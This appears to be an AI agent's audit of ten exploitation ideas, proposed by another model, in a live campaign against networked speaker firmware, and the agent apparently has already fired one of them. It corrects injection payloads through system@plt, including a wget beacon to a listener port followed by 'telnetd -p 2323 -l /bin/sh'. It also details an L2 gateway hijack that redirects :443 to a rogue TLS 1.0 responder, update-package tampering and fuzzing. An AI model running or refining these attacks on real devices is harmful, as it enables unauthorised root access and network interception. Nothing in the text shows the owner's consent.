# Scoring GLM's ten ideas — candid audit

Scale: 0–1000 = goodness × practical utility × implementability, divided by complexity-vs-value.
Bands: **≥750** fire tonight · 600–749 strong, needs a fix first · 400–599 real work, medium odds ·
250–399 background · <250 shelf.

Ground truth applied: the SYSPLT fire GLM ranks #1 **already ran tonight — device reboot, no
listener**; the shipped trailing type-3 is **plaintext**; `/status/upgradeinfo` is **empty** after
every fire and `/status/jffs/*` returns empty documents on both builds; the live S2 manifest
serves a real **86.11-82170** model-12 package that is already downloaded; and the live `:8643`
responder's TLS stack cannot serve a 57.23 unit without a patch (proved below).

| # | idea (abbrev.) | score |
|---|---|---|
| 1 | PPC `system@plt`, `;`-prefix at node200+4 | **780** |
| 2 | S2 `system@plt` 0x6DCEA0 / mid-function jal | **700** |
| 3 | gateway hijack + `:443` → responder → native MinVersion | **640** |
| 4 | fuzz type-21 / type-22 pre-signature | **430** |
| 5 | ride a newer genuine build + trailing type-3 | **520** |
| 6 | read `/status/upgradeinfo` | **420** |
| 7 | decode the fetch-filename `sonosFileCreate` site | **450** |
| 8 | qemu-ppc gdb dump of r3/r4 | **400** |
| 9 | decode what feeds `/var/run/forceupdateurl` | **350** |
| 10 | Flags 0–31 × ExtraOptions matrix | **300** |
| **mean** | | **499** |

---

## 1 — PPC `system@plt` with the `;` prefix — **780**

**Right.** The single best play: right address, right argument (`r3=B`), the `;` fix for the
unavoidable 4-byte `&V` prefix, and the observation that this retires the `argv=notify-ctx`
falsification is sound (that was the execve wrapper, not `system`). Credit where due: nothing else
in either list has all ingredients device-proven.

**Wrong / stale.** It is no longer an untried hypothesis — **it fired tonight and produced a full
device reboot with no listener**. GLM's branch table has "no listener + no crash", "crash",
"listener + later reboot" but **not the observed cell**. Read plainly, a reboot means the notify
thread blocked on a *valid* pointer long enough to trip the watchdog: `r3=B` and `system()` are
confirmed, and the failure is the child (`sh -c` → telnetd) — the same wall as B2, not a
register problem.

**Defects in the command.** (a) It writes a **bare node buffer** — no 4-byte file magic, no TOC, no
`acelp` codec tag — into `recon/tnzm_audible/sweep/`, while every payload that works is
`magic+TOC+codec`(36 B)+node buffer. As pasted, that file is not a transport-parseable `.aa`.
(b) The `assert` checks `(S+600)` for NULs but not for shell metacharacters (harmless here, but the
check is half-done). (c) No fast-returning first payload: it goes straight to a daemon.

**What raises it to 900+.** Beacon first (`wget -qO- …:8985/SYSPLT`), then `telnetd … &` (or
`sh /etc/scripts/run_sshd.sh &`) so `system()` cannot block; wrap with the 36-byte header; and a
`/dev/pts` check, since it assumes a standalone telnetd when `/usr/sbin/telnetd` is in fact a
**busybox symlink** (`ls -l` → `../../bin/busybox`) whose pty needs are unverified.

## 2 — S2 `system@plt` (0x6DCEA0) or the mid-function jump — **700**

**Right.** `0x6DCEA0` is the correct stub and it correctly states `0x6DCE50` is `kill@` — a real
correction over most earlier work. The "A/B with a beacon instead of `true`" discipline is exactly
right.

**Stale.** It calls a0-at-entry "the open question after the killall correction". It is answered:
`a0 = node0` is proven (observer cell `F=node0`, and the same document it cites says so). Variant
(b) therefore loses most of its point — it is mid-function risk for no arg-control gain.

**Wrong choice of child.** It uses **dropbear**, the one binary that has already died silently twice
on .135, instead of telnetd or a beacon-only probe. On S2 the `;` prefix is also unnecessary (a0
starts at node0 — no junk dword), which shows the PPC constraint was copied unexamined. And it
spends 71 of the 107 bytes before proving the child type at all.

**What raises it.** `0x6DCEA0` + `wget -qO- …/S2SYS135;/usr/sbin/telnetd -p 2323 -l /bin/sh`
(82 B), then dropbear only as a fallback; and note that port 2323 can stay closed even when the
child runs.

## 3 — gateway hijack → `:443` → native MinVersion — **640**

**Right, and better argued than my own version.** "An L2 hijack is neither DNS nor eero" is the
correct defence of the constraint, and reusing the already-verified eMudhra chain is the right
asset. This is the only idea in either list that satisfies the arming *natively* instead of
fighting the templater.

**It would fail as written, on TLS.** The live responder does `ssl.PROTOCOL_TLS_SERVER` with no
minimum version and no cipher string; this Mac's `python3` is **3.15 with OpenSSL 4.1.0**, and
OpenSSL 4 has dropped TLS ≤1.1 — while the device client is TLS 1.0 only (the same fact that killed
the earlier `tls443` services). Measured just now: `ctx.minimum_version=TLSv1` +
`set_ciphers('ALL:@SECLEVEL=0')` makes it work (`New, TLSv1.0, Cipher is
ECDHE-ECDSA-AES256-SHA`; 24 TLSv1.0 suites are available). Without those two lines the unit gets a
`protocol_version` alert and the idea looks dead for the wrong reason.

**Smaller defects.** `-> 127.0.0.1:8643` and `to any port 443` both diverge from the live,
source-scoped rule (`-> 192.168.4.160:8643`, specific sources) that exists to avoid colliding with
another agent's `:443` service — `to any` can steal it. No revert recipe for
`net.inet.ip.forwarding`. And the fetch *cadence* (does the settings job run idle? only on the
deferred path?) is unstated, which is its own blocker.

**Raises it.** Ship the TLS patch in the same change, keep the source-scoped rdr, and add the
settings-job trigger (idle/wake or the deferred path) as an explicit step.

## 4 — fuzz type-21 / type-22 pre-signature — **430**

**Right.** Type-21 is genuinely unfuzzed, and it is plaintext and pre-signature. The harness exists.

**Discounts.** The two obvious surfaces are already closed by measurement: 128 mutations of the
type-22 header and 128 of the signature ring parsed clean, and the parsers are fixed-size
(`read_hdr` copies exactly 0x10). The promised payoff is a *crash*; converting a PPC crash in a
root updater into execution without a debugger is a second, larger project. And the harness is
reachable only through a **patched** binary (`0x8654` compat NOP), so it can surface bugs the device
never reaches. A whole overnight cycle for "maybe a candidate" is poor value against idea 1's one
fire.

## 5 — ride a newer genuine build — **520**

**Half of it is already dead.** I checked the live feed: model 16 has **no** entry above
57.23-74170 (the 80060 manifest lists model 16 only at 34.16; eight directory/filename variants 404),
and `CheckForUpdate` returns `DownloadSize=0`. So the S1 half — the half this idea is written for —
dies. The S2 half survives and is now the best install route in the campaign: `86.11-82170` >
86.10-81100 for model 12, 7 493 709 B, downloaded and staged.

**It also misses the decisive detail about today's failure.** Our packages' trailing type-3 is
**plaintext** (`type 3`, 237 B, field 0, payload `#!/bin/sh`), and plaintext type-3 never executes —
its own source document says so. "Append our trailing type-3" as written reproduces tonight's
no-op. It then leans on `verify_upd.py` PASS as if that implied execution; it does not.
Its "trailing 12 bytes as IV XORed with a per-blob tag" is also a vague sketch of the real
`886499ca` envelope the repo's `build_upd_rootfs.envelope()` implements.

## 6 — read `/status/upgradeinfo` — **420**

**Right diagnosis, spent action.** It was the correct 30-second first move — and it is already
answered: empty on .84 and .202 now, empty after every fire in the logs, with or without a boot
attempt. As a *plan item* today its remaining value is near zero, so its rank (#1 in its own
"only three things" list, ahead of a live exploit) overstates it. Its inference — empty ⇒ the
injection is dead ⇒ arming must be native — is correct and is exactly why idea 3 matters.

## 7 — decode the fetch-filename `sonosFileCreate` site — **450**

**Attractive, one assumption short.** The fetcher is `wget -qC <url> -O -` piped into the parser,
and `/var/run/upgradeinfo` holds `URL:` as *content* — so a `../` in the URL has no filename to land
in unless a second, different writer derives one. The site is also runtime-vtable dispatched with
no static refs, so the decode may end at "who owns this object" rather than at the name. An hour is
justified; the promised `Configure.dev` in one fetch is not until the name source is known.

## 8 — qemu-ppc gdb dump of r3/r4 — **400**

**Was the right de-risker last week; now largely superseded.** `r3=B` is device-confirmed (tonight's
behaviour), and the argv contents only matter for the execve wrapper, which the `system` route
bypasses. The PPC daemon under qemu also stops at the flash/MDP model wall (documented), so the
`:1400` bind the idea needs is not guaranteed, and the S2 playbook's fixes are not transferable
across ISA and loader. Still the best rehearsal rig; still a session.

## 9 — decode what feeds `/var/run/forceupdateurl` — **350**

**Cheap but thin.** The handler writes a URL file and touches a one-shot flag, plus
`killall anacapad`; the install still has to clear the verdict, and on S2 a genuine upgrade now
exists anyway. "Request-reachable" is speculative: the fields are device/cloud state, and the
`/status` name table is a fixed subset. Its fallback ("need one write first") is the whole idea
collapsing.

## 10 — Flags 0–31 × ExtraOptions, ~128 fires — **300**

**Lowest information per action.** It polls the oracle that is *empty*, so most cells yield nothing;
its premise (some bit routes to a deferred path that re-reads MinVersion) is untested; the earlier
flags sweep over 0..31 plus big constants already closed nothing; and at ~2 min per fire it is a
4-hour evening per unit for a likely all-negative result. It should have been scoped to the handful
of bits the handler actually reads. Its own risk note concedes it is ballast.

---

## Cross-cutting errors

1. **It never branches on the outcome that actually occurred.** Four ideas assume a spawned child
   binds; one fire already showed the child is the problem.
2. **It ships the plaintext record as if it were the fix** and never inspects the 237 bytes.
3. **It treats the `ExtraOptions` MinVersion injection as a live lane** (ideas 6 and 10) while the
   measured state is empty — the same assumption that produced four null sessions.
4. **Its first command builds an unparseable payload** (no `.aa` magic/TOC/codec).
5. **It calls proven facts open** (`a0 = node0`) and so budgets a variant it does not need.
6. **It would fail its own best strategic idea on TLS 1.0** against the live responder, and would
   collide with the existing source-scoped `:443` rule.
7. **No on-device observability model**: `/status/jffs/*` is empty, so "install and read the log"
   needs the log's registration window, which no idea here exploits.

## What to keep

- **1 and 2 stay the top two fires**, corrected: 36-byte wrapper, beacon first, telnetd (not
  dropbear), and a `&`/fast-return so `system()` cannot block the notify thread.
- **3 survives as the S1 install strategy**, with the two-line TLS patch and the source-scoped rdr.
- **5 survives as the S2 install strategy only** (the S1 half is measured dead).
- **7 as a one-hour side decode; 4 and 8 as reserve; 9 and 10 shelf** until something they depend on
  changes.

Honest summary: GLM's tactical judgement is sound and it found the two correct addresses, but it was
written against the state *before* tonight's fire and before the feed/protocol measurements, so its
top two ideas are right plays with stale branches and its strategic tier rests on an empty file.
